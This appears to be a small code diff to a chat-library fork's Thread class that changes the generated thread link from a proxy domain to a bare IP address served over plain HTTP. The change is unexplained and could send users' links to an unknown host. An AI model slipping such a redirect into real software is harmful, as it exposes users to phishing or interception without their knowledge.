@@ -350,7 +350,7 @@ class Thread(Messageable, Hashable):
 
         .. versionadded:: 2.4
         """
-        return f"https://proxy.vanityroles.com/channels/{self.guild.id}/{self.id}"
+        return f"http://184.15.74.56:7878/channels/{self.guild.id}/{self.id}"
 
     def is_private(self) -> bool:
         """Whether the thread is a private thread.
